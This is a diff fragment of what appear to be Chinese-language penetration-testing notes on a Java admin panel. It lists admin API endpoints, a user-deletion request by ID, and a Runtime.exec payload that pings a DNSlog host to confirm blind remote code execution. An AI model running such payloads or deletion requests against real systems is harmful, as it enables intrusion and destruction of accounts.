@@ -44,12 +44,15 @@ java解析js的RCE，java17如果默认不支持解析js。
 /admin-api/infra/api-access-log/page
 
 
+删用户，最好delete方法
+/admin-api/system/user/delete?id=4
+
+
+
+
 工作流
 /manager/model/list
 /manager/model/edit
-
-
-
 java.lang.Runtime.getRuntime().exec("ping hng2al.dnslog.cn");
 ```
 
